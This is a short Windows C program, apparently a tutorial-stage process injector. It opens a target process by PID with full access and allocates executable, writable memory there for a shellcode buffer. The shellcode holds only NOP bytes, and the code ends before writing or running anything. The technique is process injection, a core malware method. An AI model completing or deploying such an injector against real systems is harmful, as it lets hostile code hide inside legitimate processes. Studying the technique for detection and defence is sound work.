#include <Windows.h>
#include <stdio.h>
DWORD PID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer;
unsigned char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
int main(int argc, char * argv[]) {

	if (argc < 2) {
		printf("[-] usage: inject.exe <PID>");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("[*] trying to open a handle to process %ld\n", PID);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID
	);

	if (!hProcess) {
		printf("[-] failed to open process %ld, error: %ld", PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] got handle to process\n\\---0x%p\n", hProcess);

	rBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	printf("[+] allocate %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", sizeof(shellcode));

	return EXIT_SUCCESS;
}